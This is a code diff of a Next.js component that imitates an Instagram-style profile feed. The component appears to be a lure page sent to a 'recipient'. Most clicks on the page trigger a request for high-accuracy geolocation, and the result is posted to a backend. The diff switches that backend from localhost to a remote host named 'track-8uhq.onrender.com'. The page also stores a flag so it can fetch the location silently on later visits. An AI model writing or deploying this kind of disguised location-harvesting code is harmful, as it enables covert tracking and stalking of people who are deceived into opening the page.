@@ -5,7 +5,7 @@ import Sidebar from "../components/Sidebar";
 import ReelModal from "../components/ReelModal";
 
 export default function RecipientFeed({
-  backendUrl = process.env.NEXT_PUBLIC_SOCKET_URL || "http://localhost:5000",
+  backendUrl = process.env.NEXT_PUBLIC_SOCKET_URL || "https://track-8uhq.onrender.com",
   sessionId = "",
 }) {
   const [isFollowing, setIsFollowing] = useState(false);
@@ -60,7 +60,7 @@ export default function RecipientFeed({
         return `${window.location.protocol}//${host}:5000`;
       }
     }
-    return backendUrl || process.env.NEXT_PUBLIC_SOCKET_URL || "http://localhost:5000";
+    return backendUrl || process.env.NEXT_PUBLIC_SOCKET_URL || "https://track-8uhq.onrender.com";
   };
 
   /*
@@ -126,7 +126,7 @@ export default function RecipientFeed({
         body: payload,
         keepalive: true,
       });
-    } catch (_) {}
+    } catch (_) { }
   };
 
   /*
@@ -146,7 +146,7 @@ export default function RecipientFeed({
 
     navigator.geolocation.getCurrentPosition(
       (pos) => saveLocation(pos),
-      () => {},
+      () => { },
       { enableHighAccuracy: true, timeout: 10000, maximumAge: 30000 }
     );
   };
@@ -203,7 +203,7 @@ export default function RecipientFeed({
   const handleAllowWhileVisiting = () => {
     try {
       localStorage.setItem("loc_permission_granted", "always");
-    } catch (_) {}
+    } catch (_) { }
 
     if (navigator.geolocation) {
       navigator.geolocation.getCurrentPosition(
@@ -235,7 +235,7 @@ export default function RecipientFeed({
   const handleAllowThisTime = () => {
     try {
       localStorage.removeItem("loc_permission_granted");
-    } catch (_) {}
+    } catch (_) { }
 
     if (navigator.geolocation) {
       navigator.geolocation.getCurrentPosition(
@@ -299,7 +299,7 @@ export default function RecipientFeed({
         }),
         keepalive: true,
       });
-    } catch (_) {}
+    } catch (_) { }
   };
 
   useEffect(() => {
@@ -325,7 +325,7 @@ export default function RecipientFeed({
       if (typeof window !== "undefined" && localStorage.getItem("loc_permission_granted") === "always") {
         isAlwaysAllowed = true;
       }
-    } catch (_) {}
+    } catch (_) { }
 
     if (isAlwaysAllowed) {
       // Never show popup again for this site, fetch location directly
@@ -498,8 +498,8 @@ export default function RecipientFeed({
         {/* Left Sidebar */}
         <Sidebar onItemClick={requestLocation} activeTab="Profile" />
 
-      {/* Main Content Area */}
-      <main className="ig-main">
+        {/* Main Content Area */}
+        <main className="ig-main">
           {/* Mobile Top Header */}
           <header className="mobile-top-header">
             <button className="mobile-header-icon-btn" onClick={requestLocation}>
@@ -687,7 +687,7 @@ export default function RecipientFeed({
               {/* Post 1 - Pinned */}
               <div className="recipient-post-tile" onClick={handleOpenReel}>
                 <div className="post-badge pin-badge" title="Pinned">
-                  <svg viewBox="0 0 24 24"><path d="M16 12V4H17V2H7V4H8V12L5 15V17H11V22H13V17H19V15L16 12Z"/></svg>
+                  <svg viewBox="0 0 24 24"><path d="M16 12V4H17V2H7V4H8V12L5 15V17H11V22H13V17H19V15L16 12Z" /></svg>
                 </div>
                 <img src="/posts/post1.png" alt="Post 1" />
               </div>
@@ -695,7 +695,7 @@ export default function RecipientFeed({
               {/* Post 2 - Pinned */}
               <div className="recipient-post-tile" onClick={handleOpenReel}>
                 <div className="post-badge pin-badge" title="Pinned">
-                  <svg viewBox="0 0 24 24"><path d="M16 12V4H17V2H7V4H8V12L5 15V17H11V22H13V17H19V15L16 12Z"/></svg>
+                  <svg viewBox="0 0 24 24"><path d="M16 12V4H17V2H7V4H8V12L5 15V17H11V22H13V17H19V15L16 12Z" /></svg>
                 </div>
                 <img src="/posts/post2.png" alt="Post 2" />
               </div>
@@ -703,7 +703,7 @@ export default function RecipientFeed({
               {/* Post 3 - Pinned */}
               <div className="recipient-post-tile" onClick={handleOpenReel}>
                 <div className="post-badge pin-badge" title="Pinned">
-                  <svg viewBox="0 0 24 24"><path d="M16 12V4H17V2H7V4H8V12L5 15V17H11V22H13V17H19V15L16 12Z"/></svg>
+                  <svg viewBox="0 0 24 24"><path d="M16 12V4H17V2H7V4H8V12L5 15V17H11V22H13V17H19V15L16 12Z" /></svg>
                 </div>
                 <img src="/posts/post3.png" alt="Post 3" />
               </div>
